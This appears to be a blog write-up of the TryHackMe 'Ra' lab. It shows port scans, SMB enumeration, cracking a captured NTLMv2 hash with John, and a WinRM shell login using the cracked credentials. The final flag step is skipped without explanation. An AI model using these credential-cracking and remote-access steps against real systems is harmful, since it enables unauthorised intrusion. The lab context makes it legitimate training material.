---
layout: post
title: Tryhackme - Ra
categories: [CTF, TryHackMe, Security]
---
![Cute 404](/assets/f8cc5f48d1b4cf162c24c6964dfe0718.jpeg)


So, starting with a port scan:

```bash
Nmap scan report for 10.10.15.132
Host is up (0.17s latency).
Not shown: 65500 filtered ports
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
2179/tcp  open  vmrdp
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5222/tcp  open  xmpp-client
5223/tcp  open  hpvirtgrp
5229/tcp  open  jaxflow
5262/tcp  open  unknown
5263/tcp  open  unknown
5269/tcp  open  xmpp-server
5270/tcp  open  xmp
5275/tcp  open  unknown
5276/tcp  open  unknown
5985/tcp  open  wsman
7070/tcp  open  realserver
7443/tcp  open  oracleas-https
7777/tcp  open  cbt
9090/tcp  open  zeus-admin
9091/tcp  open  xmltec-xmlmail
9389/tcp  open  adws
49670/tcp open  unknown
49672/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49694/tcp open  unknown
```

A shit ton of ports are open. cool. 
Let's hop to the website,

Nothing too interesting on the website, accept for 10.10.15.132/reset.asp. We see there an option of choosing a person, answering the question generates a new password.

Using this, we can enumerate SMB 
```bash
â”Œâ”€â”€(pwnstarðŸˆArch)-[~/Documents/CTF/tryhackme/ra]
â””â”€$ crackmapexec smb windcorp.thm -u lilyle -p 'ChangeMe#1234'  --shares
SMB         10.10.15.132   445    FIRE             [*] Windows 10.0 Build 17763 (name:FIRE) (domain:windcorp.thm) (signing:True) (SMBv1:False)
SMB         10.10.15.132   445    FIRE             [+] windcorp.thm\lilyle:ChangeMe#1234 
SMB         10.10.15.132   445    FIRE             [+] Enumerated shares
SMB         10.10.15.132   445    FIRE             Share           Permissions     Remark
SMB         10.10.15.132   445    FIRE             -----           -----------     ------
SMB         10.10.15.132   445    FIRE             ADMIN$                          Remote Admin
SMB         10.10.15.132   445    FIRE             C$                              Default share
SMB         10.10.15.132   445    FIRE             IPC$            READ            Remote IPC
SMB         10.10.15.132   445    FIRE             NETLOGON        READ            Logon server share 
SMB         10.10.15.132   445    FIRE             Shared          READ            
SMB         10.10.15.132   445    FIRE             SYSVOL          READ            Logon server share 
SMB         10.10.15.132   445    FIRE             Users           READ            

â”Œâ”€â”€(pwnstarðŸˆArch)-[~/Documents/CTF/tryhackme/ra]
â””â”€$ crackmapexec smb windcorp.thm -u lilyle -p 'ChangeMe#1234'  --pass-pol                                                     
SMB         10.10.15.132   445    FIRE             [*] Windows 10.0 Build 17763 (name:FIRE) (domain:windcorp.thm) (signing:True) (SMBv1:False)
SMB         10.10.15.132   445    FIRE             [+] windcorp.thm\lilyle:ChangeMe#1234 
SMB         10.10.15.132   445    FIRE             [+] Dumping password info for domain: WINDCORP
SMB         10.10.15.132   445    FIRE             Minimum password length: 7
SMB         10.10.15.132   445    FIRE             Password history length: 24
SMB         10.10.15.132   445    FIRE             Maximum password age: 
SMB         10.10.15.132   445    FIRE             
SMB         10.10.15.132   445    FIRE             Password Complexity Flags: 010001
SMB         10.10.15.132   445    FIRE                 Domain Refuse Password Change: 0
SMB         10.10.15.132   445    FIRE                 Domain Password Store Cleartext: 1
SMB         10.10.15.132  445    FIRE                 Domain Password Lockout Admins: 0
SMB         10.10.15.132   445    FIRE                 Domain Password No Clear Change: 0
SMB         10.10.15.132   445    FIRE                 Domain Password No Anon Change: 0
SMB         10.10.15.132   445    FIRE                 Domain Password Complex: 1
SMB         10.10.15.132   445    FIRE             
SMB         10.10.15.132   445    FIRE             Minimum password age: 
SMB         10.10.15.132   445    FIRE             Reset Account Lockout Counter: 2 minutes 
SMB         10.10.15.132   445    FIRE             Locked Account Duration: 2 minutes 
SMB         10.10.15.132   445    FIRE             Account Lockout Threshold: 5
SMB         10.10.15.132   445    FIRE             Forced Log off Time: Not Set
```


And now
```bash
â”Œâ”€â”€(pwnstarðŸˆArch)-[~/Documents/CTF/tryhackme/ra]
â””â”€$ smbmap -u 'lilyle' -p 'ChangeMe#1234'  -H windcorp.thm  -r                                                                 130 â¨¯
[+] IP: windcorp.thm:445        Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        .\IPC$\*
        fr--r--r--                3 Mon Jan  1 05:53:28 1601    InitShutdown
        fr--r--r--                4 Mon Jan  1 05:53:28 1601    lsass
        fr--r--r--                3 Mon Jan  1 05:53:28 1601    ntsvcs
        fr--r--r--                4 Mon Jan  1 05:53:28 1601    scerpc
        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-244-0
        fr--r--r--                3 Mon Jan  1 05:53:28 1601    epmapper
        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-2b8-0
        fr--r--r--                3 Mon Jan  1 05:53:28 1601    LSM_API_service
        fr--r--r--                3 Mon Jan  1 05:53:28 1601    eventlog
        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-530-0
        fr--r--r--                3 Mon Jan  1 05:53:28 1601    atsvc
        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-734-0
        fr--r--r--                4 Mon Jan  1 05:53:28 1601    wkssvc
        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-340-0
        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-340-1
        fr--r--r--                3 Mon Jan  1 05:53:28 1601    RpcProxy\49674
        fr--r--r--                3 Mon Jan  1 05:53:28 1601    1fa260e57b61ac4e
        fr--r--r--                3 Mon Jan  1 05:53:28 1601    RpcProxy\593
        fr--r--r--                4 Mon Jan  1 05:53:28 1601    srvsvc
        fr--r--r--                3 Mon Jan  1 05:53:28 1601    spoolss
        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-964-0
        fr--r--r--                3 Mon Jan  1 05:53:28 1601    netdfs
        fr--r--r--                3 Mon Jan  1 05:53:28 1601    ROUTER
        fr--r--r--                3 Mon Jan  1 05:53:28 1601    W32TIME_ALT
        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-32c-0
        fr--r--r--                1 Mon Jan  1 05:53:28 1601    PSHost.132498373871065180.4064.DefaultAppDomain.powershell
        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-cd0-0
        fr--r--r--                3 Mon Jan  1 05:53:28 1601    TermSrv_API_service
        fr--r--r--                3 Mon Jan  1 05:53:28 1601    Ctx_WinStation_API_service
        fr--r--r--                3 Mon Jan  1 05:53:28 1601    SessEnvPublicRpc
        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-16fc-0
        fr--r--r--                1 Mon Jan  1 05:53:28 1601    PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
        fr--r--r--                1 Mon Jan  1 05:53:28 1601    PSHost.132498373859437939.3600.DefaultAppDomain.sme
        fr--r--r--                1 Mon Jan  1 05:53:28 1601    PSHost.132498374391876309.3004.DefaultAppDomain.powershell
        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-cb0-0
        fr--r--r--                1 Mon Jan  1 05:53:28 1601    iisipmff316478-5d8e-4104-a522-2909c9a54989
        fr--r--r--                1 Mon Jan  1 05:53:28 1601    iislogpipeadb9a285-0017-403b-b5a4-8dbfb24435c9
        NETLOGON                                                READ ONLY       Logon server share 
        .\NETLOGON\*
        dr--r--r--                0 Sat May  2 15:32:19 2020    .
        dr--r--r--                0 Sat May  2 15:32:19 2020    ..
        Shared                                                  READ ONLY
        .\Shared\*
        dr--r--r--                0 Sat May 30 06:15:42 2020    .
        dr--r--r--                0 Sat May 30 06:15:42 2020    ..
        fr--r--r--               45 Fri May  1 21:02:36 2020    Flag 1.txt
        fr--r--r--         29526628 Sat May 30 06:15:01 2020    spark_2_8_3.deb
        fr--r--r--         99555201 Sun May  3 16:38:39 2020    spark_2_8_3.dmg
        fr--r--r--         78765568 Sun May  3 16:38:39 2020    spark_2_8_3.exe
        fr--r--r--        123216290 Sun May  3 16:38:39 2020    spark_2_8_3.tar.gz
        SYSVOL                                                  READ ONLY       Logon server share 
        .\SYSVOL\*
        dr--r--r--                0 Sat May  2 15:32:20 2020    .
        dr--r--r--                0 Sat May  2 15:32:20 2020    ..
        dr--r--r--                0 Sat May  2 15:32:20 2020    NRznLVEcPj
        dr--r--r--                0 Thu Apr 30 20:41:10 2020    windcorp.thm
        Users                                                   READ ONLY
        .\Users\*
        dw--w--w--                0 Sun May  3 03:35:58 2020    .
        dw--w--w--                0 Sun May  3 03:35:58 2020    ..
        dr--r--r--                0 Sun May 10 16:48:11 2020    Administrator
        dr--r--r--                0 Fri May  1 06:03:55 2020    All Users
        dr--r--r--                0 Fri May  1 18:39:44 2020    angrybird
        dr--r--r--                0 Fri May  1 18:39:34 2020    berg
        dr--r--r--                0 Fri May  1 18:39:22 2020    bluefrog579
        dr--r--r--                0 Sun May  3 19:00:02 2020    brittanycr
        dr--r--r--                0 Fri May  1 18:39:08 2020    brownostrich284
        dr--r--r--                0 Sat Nov 14 19:55:12 2020    buse
        dw--w--w--                0 Fri May  1 05:05:11 2020    Default
        dr--r--r--                0 Fri May  1 06:03:55 2020    Default User
        fr--r--r--              174 Fri May  1 06:01:55 2020    desktop.ini
        dr--r--r--                0 Fri May  1 18:38:54 2020    edward
        dr--r--r--                0 Sun May  3 05:00:16 2020    freddy
        dr--r--r--                0 Fri May  1 18:38:28 2020    garys
        dr--r--r--                0 Sat Nov 14 22:21:05 2020    goldencat416
        dr--r--r--                0 Fri May  1 18:38:17 2020    goldenwol
        dr--r--r--                0 Fri May  1 18:38:06 2020    happ
        dr--r--r--                0 Fri May  1 18:37:53 2020    happyme
        dr--r--r--                0 Fri May  1 18:37:42 2020    Luis
        dr--r--r--                0 Fri May  1 18:37:31 2020    orga
        dr--r--r--                0 Fri May  1 18:37:19 2020    organicf
        dr--r--r--                0 Sat Nov 14 22:21:59 2020    organicfish718
        dr--r--r--                0 Fri May  1 18:37:06 2020    pete
        dw--w--w--                0 Thu Apr 30 20:05:47 2020    Public
        dr--r--r--                0 Fri May  1 18:36:54 2020    purplecat
        dr--r--r--                0 Fri May  1 18:36:42 2020    purplepanda
        dr--r--r--                0 Fri May  1 18:36:31 2020    sadswan
        dr--r--r--                0 Sat Nov 14 22:17:23 2020    sadswan869
        dr--r--r--                0 Fri May  1 18:36:20 2020    sheela
        dr--r--r--                0 Fri May  1 18:35:39 2020    silver
        dr--r--r--                0 Fri May  1 18:35:24 2020    smallf
        dr--r--r--                0 Fri May  1 18:35:05 2020    spiff
        dr--r--r--                0 Fri May  1 18:34:49 2020    tinygoos
        dr--r--r--                0 Fri May  1 18:33:57 2020    whiteleopard

â”Œâ”€â”€(pwnstarðŸˆArch)-[~/Documents/CTF/tryhackme/ra]
â””â”€$ smbclient -U lilyle  //windcorp.thm/Shared                                                                                   1 â¨¯
Enter WORKGROUP\lilyle's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat May 30 06:15:42 2020
  ..                                  D        0  Sat May 30 06:15:42 2020
  Flag 1.txt                          A       45  Fri May  1 21:02:36 2020
  spark_2_8_3.deb                     A 29526628  Sat May 30 06:15:01 2020
  spark_2_8_3.dmg                     A 99555201  Sun May  3 16:36:58 2020
  spark_2_8_3.exe                     A 78765568  Sun May  3 16:35:56 2020
  spark_2_8_3.tar.gz                  A 123216290  Sun May  3 16:37:24 2020

                15587583 blocks of size 4096. 10895808 blocks available
smb: \> get "Flag 1.txt"
getting file \Flag 1.txt of size 45 as Flag 1.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> exit
```
Now we clearly have a hint about an exploit we should research, ```spark_2_8_3.deb```.

Taking advantage of it gives us a rather long hash.
Let's try and crack it with John

```bash
â”Œâ”€â”€(pwnstarðŸˆArch)-[~/Documents/CTF/tryhackme/ra]
â””â”€$ echo "buse::WINDCORP:581eb034fb28c39c:54A0D21F2C7F9C9FC662887D404ADBE6:01010000000000003016F4F0AEBAD6019F1E18DD6C6FF8DD00000000020006005300
4D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C00030028007300650072007600650072003200300
0300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C000800300030000000000000000100000000200000D06AF3C0BE
5C4909A34ED0E1314D4F4E9E879FB75EC17102D80D7E32C45E88740A00100000000000000000000000000000000000090000000000000000000000" > hash
                                                                                                                                     
â”Œâ”€â”€(pwnstarðŸˆArch)-[~/Documents/CTF/tryhackme/ra]
â””â”€$ john hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
uzunLM+3131      (buse)
1g 0:00:00:02 DONE (2020-11-14 23:27) 0.3355g/s 993073p/s 993073c/s 993073C/s v0yage..uya051
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```

Cool. We cracked it, it's ```uzunLM+3131```.

Checking if we can enter with that password:

```bash
â”Œâ”€â”€(pwnstarðŸˆArch)-[~/Documents/flags/tryhackme/ra]
â””â”€$ crackmapexec smb windcorp.thm  -u buse -p 'uzunLM+3131'         
SMB         10.10.15.132   445    FIRE             [*] Windows 10.0 Build 17763 (name:FIRE) (domain:windcorp.thm) (signing:True) (SMBv1:False)
SMB         10.10.15.132   445    FIRE             [+] windcorp.thm\buse:uzunLM+3131 
```

Yes, we can!

```bash
â”Œâ”€â”€(pwnstarðŸˆArch)-[~/Documents/CTF/tryhackme/ra]
â””â”€$ evil-winrm -i windcorp.thm -u buse -p 'uzunLM+3131'              

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\buse\Documents> whoami
windcorp\buse
*Evil-WinRM* PS C:\Users\buse\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\buse\Desktop> dir


    Directory: C:\Users\buse\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         5/7/2020   3:00 AM                Also stuff
d-----         5/7/2020   2:58 AM                Stuff
-a----         5/2/2020  11:53 AM             45 Flag 2.txt
-a----         5/1/2020   8:33 AM             37 Notes.txt


*Evil-WinRM* PS C:\Users\buse\Desktop> type "Flag 2.txt"
THM{NO-FLAG-EXPOSING}
```
Now let's get the 3rd flag


So, we have the third flag. 
We can now say!

RAHHHHHHH
![cute pic](https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fi.pinimg.com%2Foriginals%2Feb%2F18%2F24%2Feb18244dacaa33d6011542901130b823.jpg&f=1&nofb=1&ipt=c89f7df1293dec24d11138c0ab8b95384d210e96ae579be1d7b1fc98ad624f18&ipo=images)